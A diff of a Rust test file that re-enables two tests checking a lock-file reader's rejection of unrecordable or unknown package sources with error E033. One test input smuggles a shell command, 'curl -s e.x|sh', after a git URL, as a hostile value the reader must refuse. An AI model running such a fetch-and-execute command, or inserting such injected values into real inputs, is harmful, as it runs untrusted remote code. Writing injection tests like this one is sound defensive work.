@@ -32,7 +32,6 @@ fn write_lock(root: &Path, name: &str, source: &str) {
     behavior = "read_lock_file",
     verify = "a lock entry whose source is no local path the lock can record is E033, and the message shows no control character"
 )]
-#[ignore = "flipped by T3"]
 fn a_lock_source_the_lock_cannot_record_is_unreadable() {
     let dir = TempDir::new().unwrap();
     for source in [
@@ -69,7 +68,6 @@ fn a_lock_source_the_lock_cannot_record_is_unreadable() {
     behavior = "read_lock_file",
     verify = "a lock entry's source is registry or local:<path>; any other source is E033"
 )]
-#[ignore = "flipped by T3"]
 fn an_unknown_lock_source_is_unreadable() {
     let dir = TempDir::new().unwrap();
     for source in ["git+https://h/r; curl -s e.x|sh", "local", "Registry", ""] {
